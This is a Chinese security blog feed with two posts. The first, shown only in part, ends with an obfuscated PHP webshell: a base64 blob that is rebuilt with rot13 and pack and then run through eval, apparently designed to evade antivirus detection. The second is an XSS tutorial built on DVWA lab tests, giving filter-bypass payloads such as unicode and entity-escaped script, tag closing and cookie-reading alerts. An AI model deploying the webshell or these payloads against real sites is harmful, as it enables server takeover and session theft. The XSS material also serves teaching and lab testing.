kzbzIyM3JyNG84OG5yN29ubjdyNzlvbnJyNW9xOTUzcDJzNjEzcjNwMnM3NDY4M3IzcDc0NjgyMDczNzQ3OTZwNjUzcTIyNzc2OTY0NzQ2ODNuMzgyNTIyM3JyNjkzOHFyNG9xOXAzcDJzNzQ2ODNyM3A3NDY4MjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MjUyMjNycjVvMTlycjY4MG43M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zMTM3MjUyMjNycjU4ODlvcjVvb29ucjY5N282cjk5N280M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zMTM3MjUyMjNycjRvc25ycjY5NG85cjY5N282cjk5N280M3Ayczc0NjgzcjNwNzQ2ODIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zODI1MjIzcnI0bzg4b3I4b3FvcTNwMnM3NDY4M3IyNzNvMHEwbjY5NjYyODI0NjE3MjcyNjE3OTI5MjA3bzBxMG4wOTYxNzM2czcyNzQyODI0NjE3MjcyNjE3OTVvMjc2NDY5NzIyNzVxMjkzbzBxMG4wOTYxNzM2czcyNzQyODI0NjE3MjcyNjE3OTVvMjc2NjY5NnA2NTI3NXEyOTNvMHEwbjA5MjQ2NDZyNzU2cTIwM3EyMDI0NjY2cjc1NnEyMDNxMjAzMDNvMHEwbjA5NjY2czcyNjU2MTYzNjgyODI0NjE3MjcyNjE3OTVvMjc2NDY5NzIyNzVxMjA2MTczMjAyNDcwNjE3NDY4MjAzcTNyMjAyNDZyNjE2cTY1MjkyMDdvMHEwbjA5MDkyNDcwNzI2NTZxMjAzcTIwNzM3NTYyNzM3NDcyMjg2NDY1NjM2czYzNzQyODY2Njk2cDY1NzA2NTcyNnE3MzI4MjQ3MDYxNzQ2ODI5MjkycDJxMzQyOTNvMHEwbjA5MDkyNDYzNzQ2OTZxNjUyMDNxMjA2NDYxNzQ2NTI4Mjc1OTJxNnEycTY0MjA0ODNuNjkzbjczMjcycDY2Njk2cDY1NjM3NDY5NnE2NTI4MjQ3MDYxNzQ2ODI5MjkzbzBxMG4wOTA5MjQ2cTc0Njk2cTY1MjAzcTIwNjQ2MTc0NjUyODI3NTkycTZxMnE2NDIwNDgzbjY5M243MzI3MnA2NjY5NnA2NTZxNzQ2OTZxNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ3MjNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjM2NDI4NXAyNzI3MnIyNDZyNnM3NzY0Njk3MjJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IzcDYyM3IyNzJyNzM3NDcyNzQ3MjI4MjQ2cjYxNnE2NTJwNjE3MjcyNjE3OTI4MjcyNTMyMzcyNzIwM3EzcjIwMjc1cDI3MjcycDI3MjUzMjMyMjcyMDNxM3IyMDI3MjIyNzI5MjkycjI3M3AyczYyM3IzcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjNwNjEyMDY4NzI2NTY2M3EyMjZuNjE3NjYxNzM2MzcyNjk3MDc0M242NDY1NnA3MzI4NXAyNzI3MnIyNDZyNjE2cTY1MnIyNzVwMjcyOTNvMjIzcnI1ODhuMHI5OTluNDNwMnM2MTNyMjAyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjE2Mzc0NzMyODVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MnA1cDI3NzI2NjVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3JyNjk0bzlyNTkwOHEzcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjNwNjEyMDY4NzI2NTY2M3EyMjZuNjE3NjYxNzM2MzcyNjk3MDc0M242MTYzNzQ3MzI4NXAyNzI3MnIyNDcwNzI2NTZxMnIyNzVwMjcycDVwMjc3MDY0NXAyNzJwNXAyNzI3MnIyNDZyNjE2cTY1MnIyNzVwMjcyOTNvMjIzcjI3MnIyNDcwNzI2NTZxMnIyNzNwMnM2MTNyM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyMjcycjI0NjM3NDY5NnE2NTJyMjczcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IyNzJyMjQ2cTc0Njk2cTY1MnIyNzNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjJxM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwMnM3NDcyM3IyNzNvMHEwbjA5MDkyNDY0NnI3NTZxMm8ybzNvMHEwbjA5N3EwcTBuMDk2NjZzNzI2NTYxNjM2ODI4MjQ2MTcyNzI2MTc5NW8yNzY2Njk2cDY1Mjc1cTIwNjE3MzIwMjQ3MDYxNzQ2ODIwM3EzcjIwMjQ2cjYxNnE2NTI5MjA3bzBxMG4wOTA5MjQ3MDcyNjU2cTIwM3EyMDczNzU2MjczNzQ3MjI4NjQ2NTYzNnM2Mzc0Mjg2NjY5NnA2NTcwNjU3MjZxNzMyODI0NzA2MTc0NjgyOTI5MnAycTM0MjkzbzBxMG4wOTA5MjQ2Mzc0Njk2cTY1MjAzcTIwNjQ2MTc0NjUyODI3NTkycTZxMnE2NDIwNDgzbjY5M243MzI3MnA2NjY5NnA2NTYzNzQ2OTZxNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTI0NnE3NDY5NnE2NTIwM3EyMDY0NjE3NDY1MjgyNzU5MnE2cTJxNjQyMDQ4M242OTNuNzMyNzJwNjY2OTZwNjU2cTc0Njk2cTY1MjgyNDcwNjE3NDY4MjkyOTNvMHEwbjA5MDkyNDczNjk3bjY1MjAzcTIwNzM2OTduNjUyODY2Njk2cDY1NzM2OTduNjUyODI0NzA2MTc0NjgyOTI5M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ3MjNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYzNjg2NTYzNm82MjZzNzgyMjIwNnI2MTZxNjUzcTIyNjY2OTZwNjU3MzVvNXEyMjIwNzY2MTZwNzU2NTNxMjIyNzJyMjQ2cjYxNnE2NTJyMjcyMjNyM3A2MTIwNzQ2MTcyNjc2NTc0M3EyMjVzNjI2cDYxNnI2bzIyMjA2ODcyNjU2NjNxMjIyNzJyMjQ3NDY4Njk3Mzc1NzI2cDJyMjQ2cjYxNnE2NTJyMjcyMjNyMjcycjczNzQ3Mjc0NzIyODI0NnI2MTZxNjUycDYxNzI3MjYxNzkyODI3MjUzMjM3MjcyMDNxM3IyMDI3NXAyNzI3MnAyNzI1MzIzMjI3MjAzcTNyMjAyNzIyMjcyOTI5MnIyNzNwMnM2MTNyM3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyM3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjY3NnMyODVwMjc2NTY0Njk3NDVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3JyN29wOTZyOG9yOTEzcDJzNjEzcjIwMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjYxNjM3NDczMjg1cDI3MjcycjI0NnI2MTZxNjUycjI3NXAyNzJwNXAyNzcyNjY1cDI3MnA1cDI3MjcycjI0NnI2MTZxNjUycjI3NXAyNzI5M28yMjNycjY5NG85cjU5MDhxM3AyczYxM3IzcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0M3IzcDYxMjA2ODcyNjU2NjNxMjI2bjYxNzY2MTczNjM3MjY5NzA3NDNuNjE2Mzc0NzMyODVwMjcyNzJyMjQ3MDcyNjU2cTJyMjc1cDI3MnA1cDI3NzA2NDVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IyNzJyMjQ3MDcyNjU2cTJyMjczcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDc0NjQzcjI3MnIyNDYzNzQ2OTZxNjUycjI3M3Ayczc0NjQzcjI3M28wcTBuMDkwOTY1NjM2ODZzMjAyNzNwNzQ2NDNyMjcycjI0NnE3NDY5NnE2NTJyMjczcDJzNzQ2NDNyMjczbzBxMG4wOTA5NjU2MzY4NnMyMDI3M3A3NDY0MjA2MTZwNjk2NzZyM3EyMjcyNjk2NzY4NzQyMjNyM3A2MTIwNjg3MjY1NjYzcTIyNm42MTc2NjE3MzYzNzI2OTcwNzQzbjY3NnMyODVwMjc2NDZzNzc2cjVwMjcycDVwMjcyNzJyMjQ2cjYxNnE2NTJyMjc1cDI3MjkzbzIyM3IyNzJyMjQ3MzY5N242NTJyMjczcDJzNjEzcjNwMnM3NDY0M3IyNzNvMHEwbjA5MDk2NTYzNjg2czIwMjczcDJzNzQ3MjNyMjczbzBxMG4wOTA5MjQ2NjZyNzU2cTJvMm8zbzBxMG4wOTdxMHEwbjdxMHEwbjc1NnI3MzY1NzQyODI0NjE3MjcyNjE3OTI5M28wcTBuNjU2MzY4NnMyMDI3M3Ayczc0NjE2MjZwNjUzcjI3M28wcTBuNjU2MzY4NnMyMDI3M3A2NDY5NzYyMDYzNnA2MTczNzMzcTIyNjE2Mzc0NjE2cDZwMjIyMDczNzQ3OTZwNjUzcTIyNzQ2NTc4NzQycTYxNnA2OTY3NnIzbjZwNjU2Njc0M28yMjNyMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYzNjg2NTYzNm82MjZzNzgyMjIwNjk2NDNxMjI2MzY4Nm82MTZwNnAyMjIwNnI2MTZxNjUzcTIyNjM2ODZvNjE2cDZwMjIyMDc2NjE2cDc1NjUzcTIyNnM2cjIyMjA2czZyNjM2cDY5NjM2bzNxMjI3MzYxMjg3NDY4Njk3MzJyNjY2czcyNnEyOTNvMjIzcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI1bjQ4cXI1ODhvNjIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MzA3MDc4M28yMjIwNnM2cjYzNnA2OTYzNm8zcTVwMjc3NDc4NzQ3MzI4MjJyNW40OHFyNTg4bzZyOG83bnNyNW9yODQyMjJwMjIyNzJyMjQ2cjZzNzc2NDY5NzIycjI3MjIycDIyNjEyMjI5M281cDI3M3IyMDI3M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2Mjc1NzQ3NDZzNnIyMjIwNzY2MTZwNzU2NTNxMjJyNTg4bjByOTk5bjQyMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNTMwNzA3ODNvMjIyMDZzNnI2MzZwNjk2MzZvM3E1cDI3NjQ2NTZwNzMyODIyNjIyMjI5M281cDI3M3IyMDI3M28wcTBuNjU2MzY4NnMyMDI3M3A2OTZyNzA3NTc0MjA3NDc5NzA2NTNxMjI2Mjc1NzQ3NDZzNnIyMjIwNzY2MTZwNzU2NTNxMjJyNW8xOXJyNjgwbjcyMjIwNzM3NDc5NnA2NTNxMjI3NzY5NjQ3NDY4M24zNTMwNzA3ODNvMjIyMDZzNnI2MzZwNjk2MzZvM3E1cDI3NzQ3ODc0NzMyODIycjVvMTlycjY4MG43cjU4MG9wMjIycDIyMzAzNjM2MzYyMjJwMjI2MzIyMjkzbzVwMjczcjIwMjczbzBxMG42NTYzNjg2czIwMjczcDY5NnI3MDc1NzQyMDc0Nzk3MDY1M3EyMjYyNzU3NDc0NnM2cjIyMjA3NjYxNnA3NTY1M3EyMnI2OTdvNnI5OTdvNDIyMjA3Mzc0Nzk2cDY1M3EyMjc3Njk2NDc0NjgzbjM1MzA3MDc4M28yMjIwNnM2cjYzNnA2OTYzNm8zcTVwMjc3NDc4NzQ3MzI4MjJyNG9zbnJyNjk0bzlyNjk3bzZyOTk3bzQyMjJwMjIyNzJyMjQ2cTc0Njk2cTY1MnIyNzIyMnAyMjY0MjIyOTNvNXAyNzNyMjAyNzNvMHEwbjY1NjM2ODZzMjAyN3I3OW9ucnI1b3E5NTVvMjcycjI0NjQ2cjc1NnEycjI3NXEyMDJxMjByNjk2ODdyNG9vbzY1bzI3MnIyNDY2NnI3NTZxMnIyNzVxMjAycTIwcjVvMTlycjY4MG43NW8yNzJyMjQ2MzY4NnE2czY0MnIyNzVxM3AyczY0Njk3NjNyM3AyczY2NnM3MjZxM3IyNzNvMHEwbjYyNzI2NTYxNm8zbzBxMG43cSI7Cgkkc3RyID0gc3RyX3JvdDEzKCRzdHIpOwoJbSgkc3RyKTsKfQpmdW5jdGlvbiBtKCRzdHIpewoJZ2xvYmFsICRwYXNzd29yZDsKCSRqaiA9ICcnOwoJZXZhbCgkamoucGFjaygnSConLCRzdHIpLiRqaik7Cn0KcygpOw==&#39;;$jm=&quot;Base64_&quot;;$jm2=&quot;Decode&quot;;$jm3=$jm.$jm2; /*拼接出一个base64_decode*/$x=$jm3($a); /*解密webshell*/if (strlen($x)!=0){    $z=eval($x);}?&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/13/FxPge0.png" alt="FxPge0.png"></p><p><img src="https://s2.ax1x.com/2019/01/13/FxPhYF.png" alt="FxPhYF.png"></p><p>最后为我们的天朝即刻群打波广告：欢迎加入即刻安全技术交流群，都是大佬，一言不合就开车直播群号：307283889</p><p><img src="https://s2.ax1x.com/2019/01/13/FxPqw6.png" alt="FxPqw6.png"></p><p>转载请声明：转自422926799.github.io</p>]]></content>
      
      
        <tags>
            
            <tag> Writing </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>xss summary</title>
      <link href="/posts/5104189a.html"/>
      <url>/posts/5104189a.html</url>
      <content type="html"><![CDATA[<h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><p>学习xss漏洞，并加以总结。<br><img src="https://niuerdata.g.com.cn/data/shareimg_oss/big_media_img/2018/04/13/ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG" alt="ce5d42ee64aae7cd3f3ae30b6edd529c.JPEG"></p><h3 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h3><p><b>漏洞起因</b></p><pre><code>可以输入的地方没有做好对应的过滤，引发的xss攻击```</code></pre><p><b>危害</b></p><pre><code>1.盗取cookie2.劫持用户浏览器3.钓鱼攻击4.挂马5.在一定的条件下可以getshell6.会话劫持</code></pre><p><b>漏洞类型</b></p><pre><code>反射型XSSDOM型XSS存储型XSS其他型XSS 例如：Flash xss</code></pre><p><b>反射型xss</b><br>危险级别：低<br>插入的语句停留在当前页面。</p><p><b>DOMX型xss</b><br>危险级别：中<br>DOM型xss又分为两种<br>1.可见型<br>2.不可见型<br>插入的语句影响js</p><p><b>存储型xss</b><br>危险级别：高<br>插入的语句保存在数据库</p><p>DVWA测试：<br>在low级别下的测试，没有任何防御。可以插入任意标签如：</p><pre><code>&lt;script&gt;alert(&#39;yuan&#39;)&lt;/script&gt;&lt;img src=1 onerror=alert(1)&gt;&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;input type=&quot;text&quot; onclick=&quot;alert(1)&quot;&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjAytO.png" alt="FjAytO.png"></p><p>如果过滤了alert()如何绕过：</p><p>PHP代码：</p><pre><code>&lt;?php$name=$_POST[&#39;name&#39;];$guanjianzi=&quot;alert&quot;;$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);echo $q;?&gt;</code></pre><p>html</p><pre><code>&lt;!DOCTYPE html&gt;&lt;html lang=&quot;en&quot;&gt;&lt;head&gt;    &lt;meta charset=&quot;UTF-8&quot;&gt;    &lt;title&gt;Demo1&lt;/title&gt;&lt;/head&gt;&lt;body&gt;&lt;h1&gt;输入你的名称&lt;/h1&gt;&lt;form method=&quot;POST&quot; action=&quot;demo1.php&quot;&gt;    输入：&lt;input type=&quot;text&quot; name=&quot;name&quot;&gt;    &lt;input type=&quot;submit&quot;&gt;提交&lt;/form&gt;&lt;/form&gt;&lt;/body&gt;&lt;/html&gt;</code></pre><p>当输入alert的时候就会被替换成空，当然我们可以使用其他的什么标签来代替script，但是如果只用script如何绕过呢？使用js转义。将alert转义</p><blockquote><p>当js解释器在标识符名称(例如函数名，属性名等等)中遇到unicode编码会进行解码，并使其标志符照常生效。而在字符串中遇到unicode编码时会进行解码只会被当作字符串。</p></blockquote><p>也就是说unicode编码只能编码属性名</p><p>原</p><pre><code>&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p>js转义后</p><pre><code>&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjEh24.png" alt="FjEh24.png"></p><p>注意：使用unicode编码之前要确定对方有没有过滤\</p><p>html转义：</p><pre><code>当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段，JS字符串中，字符还可以表示为unicode的形式</code></pre><p>源：</p><pre><code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;s&lt;/a&gt;</code></pre><p>转义后</p><pre><code>&lt;a href=&quot;javascript:&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;1&amp;#41;&quot;&gt;s&lt;/a&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjVKZq.md.png" alt="FjVKZq.md.png"></p><p><img src="https://s2.ax1x.com/2019/01/12/FjVmss.png" alt="FjVmss.png"></p><p><b>输出在&lt;script&gt;&lt;/script&gt;之间的情况</b></p><pre><code>&lt;?php$name=$_POST[&#39;name&#39;];$guanjianzi=&quot;alert&quot;;$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);$c=&quot;&lt;script&gt;var w=[$q]$q;&lt;/script&gt;&quot;;echo $c;#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;/* &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt; * */#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;?&gt;</code></pre><p>绕过：</p><pre><code>]&lt;/script&gt;&lt;script&gt;\u0061\u006c\u0065\u0072\u0074(1)&lt;/script&gt;&lt;script&gt; //闭合对应前后script标签</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjdSVx.png" alt="FjdSVx.png"></p><p><b>输出在html属性里面</b><br>假设输出在input标签里面</p><pre><code>&lt;?php$name=$_POST[&#39;name&#39;];$guanjianzi=&quot;alert&quot;;$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);$c=&quot;&lt;input value=&#39;$q&#39;&gt;&quot;;echo $c;#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;/* &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt; * */#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;?&gt;</code></pre><p>绕过：</p><pre><code>1&#39; onclick=&#39;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjBGsH.png" alt="FjBGsH.png"></p><p><b>假设输出在img标签里</b></p><pre><code>&lt;?php$name=$_POST[&#39;name&#39;];$guanjianzi=&quot;alert&quot;;$q=str_replace(&quot;alert&quot;,&quot; &quot;,$name);$c=&quot;&lt;img src=&#39;$q&#39;&gt;&quot;;echo $c;#echo &quot;&lt;img src=&#39;&#39; onerror=&#39;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&#39;&gt;&quot;;#echo &quot; &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt;&quot;;/* &lt;script&gt;var a=[ ];&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;b=[ ]&lt;/script&gt; * */#echo &quot;&lt;script&gt; var a=[]&lt;/script&gt;&lt;script&gt;alert(1)&lt;/script&gt;&lt;script&gt;var a=[];document.write(a);&lt;/script&gt;&quot;;?&gt;</code></pre><p>绕过：</p><pre><code>&#39;1/**/onerror=&#39;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;</code></pre><p><img src="https://s2.ax1x.com/2019/01/12/FjBdFP.md.png" alt="FjBdFP.md.png"></p><p>输出在标签里的绕过总结：</p><pre><code>1.先想办法闭合周围的什么双引号之类的东西2.判断有什么过滤掉的，如果没有过滤自然最好3.查询标签对应可以执行js的属性，然后插入代码即可</code></pre><p><b>DOM型的xss</b><br>这里非常蛋疼，chrome拦截了DVWA那边的xss，还要我开虚拟机。。。<br>DOM型xss分为两种：<br>1.可见型DOM xss<br>2.不可见型DOM xss</p><pre><code>何为DOM？,你插入的代码会暂存在某些标签之中，并且影响输出</code></pre><p>DVWA的DOM xss就是不可见类型<br><img src="https://s2.ax1x.com/2019/01/13/FvJ9te.png" alt="FvJ9te.png"></p><p>源代码不可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJipd.md.png" alt="FvJipd.md.png"></p><p>F12可见<br><img src="https://s2.ax1x.com/2019/01/13/FvJF1A.md.png" alt="FvJF1A.md.png"></p><p>low级无任何防御直接插入payload<br><img src="https://s2.ax1x.com/2019/01/13/FvJVnP.md.png" alt="FvJVnP.md.png"></p><p>medimu级过滤了script</p><pre><code>&lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {    $default = $_GET[&#39;default&#39;];     # Do not allow script tags     if (stripos ($default, &quot;&lt;script&quot;) !== false) {  /*判断script是否出现在了参数里面*/        header (&quot;location: ?default=English&quot;);         exit;     } } ?&gt; </code></pre><pre><code>使用：&lt;/select&gt;&lt;img src=1 onerror=alert(1)&gt; //要闭合select标签，因为img在select标签里面是不可见的</code></pre><p><img src="https://s2.ax1x.com/2019/01/13/FvJZ0f.md.png" alt="FvJZ0f.md.png"></p><p>high级对default进行了判断</p><pre><code>&lt;?php // Is there any input? if ( array_key_exists( &quot;default&quot;, $_GET ) &amp;&amp; !is_null ($_GET[ &#39;default&#39; ]) ) {  /*判断是否有default这个键名和传的GETdefault参数不为null*/    # White list the allowable languages     switch ($_GET[&#39;default&#39;]) {  /*判断default是否为三个的其中一个，如果不是则重新设置header头，302跳转*/        case &quot;French&quot;:         case &quot;English&quot;:         case &quot;German&quot;:         case &quot;Spanish&quot;:             # ok             break;         default:             header (&quot;location: ?default=English&quot;);             exit;     } } ?&gt; </code></pre><p>使用#杀掉判断</p><pre><code>#&lt;script&gt;alert(1)&lt;/script&gt;</code></pre><p><img src="https://s2.ax1x.com/2019/01/13/FvJyB6.md.png" alt="FvJyB6.md.png"></p><p><b>存储型xss</b><br>当我们插入的恶意代码都会保留在数据库，下次在访问的时候就会自动执行js。</p><p>每次进入到页面都会执行js</p><p><img src="https://s2.ax1x.com/2019/01/13/FvJj3j.md.png" alt="FvJj3j.md.png"></p><p>这里就不重复了，告辞（滑稽）<br>用beef来配置存储型xss是个不错的选择</p><p>总结：</p><pre><code>xss漏洞起因    没有做好对应的过滤标签措施，导致攻击者可以注入恶意代码对付那种无任何过滤的    &lt;img src=1 onerror=alert(document.cookie)&gt;    &lt;script&gt;alert(&quot;xss&quot;)&lt;/script&gt;    &lt;script&gt;eval(alert(&#39;xss&#39;))&lt;/script&gt;    &lt;a href=&quot;javascript:localhoin=alert(1)&quot;&gt;GO&lt;/a&gt;输出在&amp;lt;script&amp;gt;&amp;lt;/script&amp;gt;之间的情况(意思就是你在script里面，得把前面的闭合了在注入语句，然后因为你在script里面直接输入语句即可)    先闭合上一个script然后在注入恶意代码:&lt;/script&gt;&lt;script&gt;alert(&quot;xss&quot;)    如果&lt;,&gt;,/等符号被过滤了可以用：eval(alert(1)) #eval()函数用于直接执行代码 参考：http://www.runoob.com/jsref/jsref-eval.html输出在其他标签里面    注意：html转义后在标签的属性中会其到一定的绕过作用 参考文章：https://www.cnblogs.com/iceli/p/8598709.html    　当浏览器接受到一份HTML代码后，会对标签之间（&lt;p&gt;xxx&lt;/p&gt;等，&lt;script&gt;除外)、标签的属性中（&lt;a href=&#39;xxxx&#39;&gt;）进行实体字符解码变为相应的字符，而不会发挥出其本来该有的功能，如：&amp;#60;被解码为&lt;后仅被当作字符，而不会被当成标签名的起始。既然是字符串，那在href=&#39;xx&#39;这些属性值本来就是字符串的地方可以作为一种可能的绕过的手段。如：        &lt;a href=&quot;&amp;#x6a;&amp;#x61;&amp;#x76;&amp;#x61;&amp;#x73;&amp;#x63;&amp;#x72;&amp;#x69;&amp;#x70;&amp;#x74;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#49;&amp;#41;&quot;&gt;&lt;/a&gt;    如在&lt;input&gt;里，解决办法：&lt;input type=&quot;text&quot; value=&quot;&quot; onclick=&quot;alert(1)&quot;&gt;    出现在a标签的href里面，类似于：&lt;a href=&quot;javascript:wds=&#39;&#39;http://www.dddd.com&quot;.getElementById(&#39;ddd&#39;).value+&#39;&amp;g=&lt;你输入的值&gt;&#39;&gt;    由于在href里面，可以使用javascript。就构造&lt;a href=&quot;javascript:wds=&#39;&#39;http://www.dddd.com&quot;.getElementById(&#39;ddd&#39;).value+&#39;&amp;g=alert(1)&#39;&gt;    如果单引号等字符被过滤的话，使用：&lt;a href=&quot;javascript:wds=&#39;&#39;http://www.dddd.com&quot;.getElementById(&#39;ddd&#39;).value+&#39;&amp;g=alert&amp;#x28;1&amp;#x29&#39;&gt; //实体化被过滤的符号 宽字节xss：    如果页面用了gbk编码的话，可以用对应的编码进行编码被过滤的符号导致可以绕过过滤 空格被实体化过滤    注解：javascript的注释符为/**/ , //    当空格被过滤后，使用注释符来绕过。例子：    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;function/**/from(){}//&quot;+&quot;&amp;param=&quot;;    location.href=&quot;.........&quot;+&quot;&amp;ss=aaaa\&quot;+&quot;&amp;from==1;alert(1);function/**/from(){}//&quot;+&quot;&amp;param=&quot;;    学到的js的一个特性：javascript会先解析函数在解析其他    例子：    a();    function as() {}     而js执行顺序是：    function as() {}    a();当输入的语句出现在注释里 (有机可乘的xss)    当输入的语句出现在js注释的源码的时候，加一个换行符就能引发xss    例如：http://xxx.com/jj.php?xxx=aaaaa    &lt;script&gt;    //function  A() {    //    var g=getElementById(demo).value;    //    document.write(g);    //}    //document.write(你输入的)    document.write(&quot;wwww&quot;);    &lt;/script&gt;    构造的xss语句：http://xxx.com/jj.php?xxx=%0aalert(1) //) #通过%0a换行符，换到了没有注释的下一行然后闭合掉后面的括号使用反斜杆构造xss    当输入的语句处于多行js代码之中，使用\分开，例子：    &lt;script&gt;getTop().location.href=&quot;/cgi-bin/loginpage?autologin=n&amp;errtype=1&amp;verify=&amp;clientuin=&quot;+&quot;&amp;t=&quot;+&quot;&amp;alias=&quot;+&quot;&amp;regalias=&quot;+&quot;&amp;delegate_url=%2Fcgi-bin%2Fframe_html%3Furl%3D%252Fcgi-bin%252Fsetting10%253Faction%253Dlist%2526t%253Dsetting10%2526ss%253Dindex%2526Mtype%253D1%2526clickpos%253D20%2526loc%253Ddelegate%252Cwebmap%252C%252C1&quot;+&quot;&amp;title=&quot;+&quot;&amp;url=%2Fcgi-bin%2Flogin%3Fvt%3Dpassport%26ss%3Daaa%2522%26from%3Dbbb\%26delegate_url%3D%252Fcgi-bin%252Fframe_html%253Furl%253D%2525252Fcgi-bin%2525252Fsetting10%2525253Faction%2525253Dlist%25252526t%2525253Dsetting10%25252526ss%2525253Dindex%25252526Mtype%2525253D1%25252526clickpos%2525253D20%25252526loc%2525253Ddelegate%2525252Cwebmap%2525252C%2525252C1